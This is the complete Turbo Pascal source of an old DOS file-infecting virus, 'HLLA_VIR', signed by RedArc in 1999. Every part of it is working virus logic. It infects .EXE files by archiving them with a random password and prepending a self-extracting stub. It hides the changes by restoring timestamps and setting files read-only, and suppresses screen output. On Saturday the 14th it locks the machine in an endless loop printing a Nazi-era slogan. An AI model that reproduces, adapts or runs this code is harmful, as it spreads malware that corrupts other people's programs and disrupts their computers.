{$A-,B-,D-,E-,F-,G-,I-,L-,N-,O-,P-,Q-,R-,S-,T-,V-,X+,Y-}
{$M 2048,10240,65536}
{1999 (c) by RedArc}
PROGRAM HLLA_VIR;

{$I-}

USES Dos, FileUtil;

TYPE
    TInfo = Record
          VirName  : String [12];
          GoatName : String [12];
          ArjName  : String [12];
          LZEName  : String [12];
          BegName  : String [12];
          BadName  : String [12];
    End;

CONST
     ExeExt = '.EXE';
     InfExt = '.INF';
     BCOFN  = 'Bad command or file name';
     VirDir = '\HLLA';
     HLLA_T = '$HLLA$.EX$';

VAR
   SR    : SearchRec;
   FA    : Word;
   FT    : LongInt;
   Home  : String;
   FName : String;
   RName : String;
   R1Name : String;
   BName : String;
   Param : String;
   I, J  : Word;
   FI    : File Of TInfo;
   Info  : TInfo;
   MyDir : String;
   Dir   : DirStr;
   Nam   : NameStr;
   Ext   : ExtStr;
   Password : String [12];
   OldInt10h : Pointer;

{$F+}
PROCEDURE MyInt10h; Interrupt;
BEGIN
END;
{$F-}

PROCEDURE Infect;
VAR
   B : Byte;
   FIName : String [12];
   F, F1 : File;
   PasswordN : Array [1..12] of Char;
   P : Pointer;
   S : String;
   S_C : Array [0..33] of Byte;
BEGIN
     Assign (F, Info.BadName);
     Erase (F);
     if IOResult <> 0 then ;
     Assign (F, SR.Name);
     ReSet (F, 1);
     if IOResult <> 0 then Exit;
     if (FileSize (F) > 200 * 1024) or (FileSize (F) < 1024) then begin
        Close (F);
        Exit;
     end;
     Close (F);
     RName  := Info.ArjName;
     R1Name := Info.LZEName;
     BName  := Info.BegName;
     with Info do begin
          VirName  := RandomName;
          GoatName := RandomName;
          ArjName  := RandomName;
          LZEName  := RandomName;
          BegName  := RandomName;
     end;
     if CopyFile (Home + '\' + SR.Name, MyDir + '\' + Info.GoatName, False) then Exit;
     if CopyFile (MyDir + '\' + FName, MyDir + '\' + Info.VirName, True) then Exit;
     FName := Info.VirName;
     if CopyFile (MyDir + '\' + RName, MyDir + '\' + Info.ArjName, True) then Exit;
     RName := Info.ArjName;
     if CopyFile (MyDir + '\' + R1Name, MyDir + '\' + Info.LZEName, True) then Exit;
     R1Name := Info.ArjName;
     if CopyFile (MyDir + '\' + BName, MyDir + '\' + Info.BegName, True) then Exit;
     BName := Info.BegName;
     ChDir (MyDir);
     if IOResult <> 0 then Exit;
     FSplit (Info.VirName, Dir, Nam, Ext);
     FIName := Nam + InfExt;
     repeat
           Info.BadName := RandomName;
           Assign (F, Info.BadName);
           ReSet (F, 1);
     until IOResult <> 0;
     ReWrite (F, 1);
     for i := 1 to 2 + Random (10) do
         S := S + RandomName;
     BlockWrite (F, S, Length (S), I);
     Close (F);
     Assign (FI, FIName);
     ReWrite (FI);
     if IOResult <> 0 then Exit;
     Write (FI, Info);
     Close (FI);
     Password := RandomName;
     for I := 1 to 12 do
         PasswordN[I] := Password[I];
     SetIntVec ($10, @MyInt10h);
     ProgramExecute (Info.ArjName, 'a -y -je -g' + Password + ' ' + SR.Name);
     SetIntVec ($10, OldInt10h);
     Erase (FI);
     Erase (F);
     Assign (F, Info.GoatName);
     SetFAttr (F, Archive);
     Erase (F);
     Assign (F, Home + '\' + SR.Name);
     GetFAttr (F, FA);
     ReSet (F,1);
     GetFTime (F, FT);
     Close (F);
     SetFAttr (F, Archive);
     Erase (F);
     {}
     Assign (F, Info.BegName);
     ReSet (F, 1);
     FileMode := 2;
     Seek (F, $43D);
     S := SR.Name + ' -e -y -g' + Password;
     J := Length (S);
     for I := 1 to 33 do
         S_C [I] := Random (256);
     S_C [0] := J + 1;
     for I := 1 to J do
         S_C [I] := Ord (S[I]);
     S_C [J+1] := 13;
     BlockWrite (F, S_C, SizeOf (S_C), I);
     B := $0D;
     BlockWrite (F, B, SizeOf (B), I);
     Seek (F, $461);
     for I := 1 to 12 do
         PasswordN[I] := Info.VirName[I];
     BlockWrite (F, PasswordN, 12, I);
     Close (F);
     SetIntVec ($10, @MyInt10h);
     ProgramExecute (Info.LZEName, Info.BegName);
     SetIntVec ($10, OldInt10h);
     Assign (F1, Info.BegName);
     ReSet (F1, 1);
     I := FileSize (F1);
     Assign (F, SR.Name);
     ReSet (F, 1);
     FileMode := 2;
     GetMem (P, 1024 * 5);
     BlockRead (F, P^, I, J);
     Seek (F, FileSize (F));
     BlockWrite (F, P^, J, I);
     Seek (F, 0);
     BlockRead (F1, P^, I, J);
     BlockWrite (F, P^, J, I);
     FreeMem (P, 1024 * 5);
     SetFTime (F, FT);
     Close (F);
     SetFAttr (F, FA+ReadOnly);
     Close (F1);
     Erase (F1);
     FSplit (Info.BegName, Dir, Nam, Ext);
     Assign (F, Nam + '.OLD');
     Rename (F, Info.BegName);
     if CopyFile (MyDir + '\' + SR.Name, Home + '\' + SR.Name, True) then begin
        Assign (FI, SR.Name);
        SetFAttr (FI, Archive);
        Erase (FI);
     end;
     if IOResult <> 0 then ;
     ChDir (Home);
END;

PROCEDURE FindGoat (FMask : String);
VAR
   F  : File;
BEGIN
     FindFirst ('*'+FMask, Archive, SR);
     while DOSError = 0 do begin
           Assign (F, SR.Name);
           GetFAttr (F, FA);
           if (FA and ReadOnly = 0) then
              Infect;
           FindNext (SR);
     end;
END;

FUNCTION ExecuteBoss : Boolean;
BEGIN
     FSplit (FName, Dir, Nam, Ext);
     Assign (FI, Home + '\' + Nam + InfExt);
     ReSet (FI);
     if IOResult <> 0 then begin
        WriteLn (BCOFN);
        ExecuteBoss := True;
        Exit;
     end;
     Read (FI, Info);
     if IOResult <> 0 then begin
        WriteLn (BCOFN);
        Close (FI);
        ExecuteBoss := True;
        Exit;
     end;
     Close (FI);
     Erase (FI);
     If IOResult <> 0 then ;
     MyDir := Home + VirDir;
     MkDir (MyDir);
     if IOResult <> 0 then begin
        ExecuteBoss := True;
        Exit;
     end;
     with Info do begin
          if CopyFile (Home + '\' + VirName, MyDir + '\' + VirName, True) then begin
             ExecuteBoss := True;
             Exit;
          end;
          if CopyFile (Home + '\' + ArjName, MyDir + '\' + ArjName, True) then begin
             ExecuteBoss := True;
             Exit;
          end;
          if CopyFile (Home + '\' + BegName, MyDir + '\' + BegName, True) then begin
             ExecuteBoss := True;
             Exit;
          end;
          if CopyFile (Home + '\' + LZEName, MyDir + '\' + LZEName, True) then begin
             ExecuteBoss := True;
             Exit;
          end;
          if CopyFile (Home + '\' + GoatName, RName, True) then begin
             ExecuteBoss := True;
             Exit;
          end;
     end;
     ProgramExecute (RName, Param);
     ExecuteBoss := False;
END;

PROCEDURE Effect;
VAR
   Y, M, D, Dof : Word;
BEGIN
     GetDate (Y, M, D, Dof);
     if (Dof = 6) and (D = 14) then begin
        SetCBreak (False);
        repeat
              WriteLn ('Jedem das Seinem!');
        until False;
     end;
END;

BEGIN
     GetIntVec ($10, OldInt10h);
     GetDir (0, Home);
     FName := ParamStr (0);
     FSplit (FName, Dir, Nam, Ext);
     FName := Nam + Ext;
     RName := ParamStr (1);
     Assign (FI, RName);
     SetFAttr (FI, Archive);
     Erase (FI);
     if IOResult <> 0 then ;
     Param := '';
     for I := 2 to ParamCount do
         Param := Param + ParamStr (I) + ' ';
     while Param [Length (Param)] = ' ' do Dec (Byte (Param [0]));
     if ExecuteBoss then Exit;
     FindGoat (ExeExt);
     ChDir (MyDir);
     FindFirst ('*.*', AnyFile, SR);
     while DOSError = 0 do begin
           if ((SR.Attr and VolumeID) = 0) and ((SR.Attr and Directory) = 0) then begin
              Assign (FI, SR.Name);
              SetFAttr (FI, Archive);
              Erase (FI);
           end;
           FindNext (SR);
     end;
     ChDir (Home);
     RmDir (MyDir);
     Effect;
END.
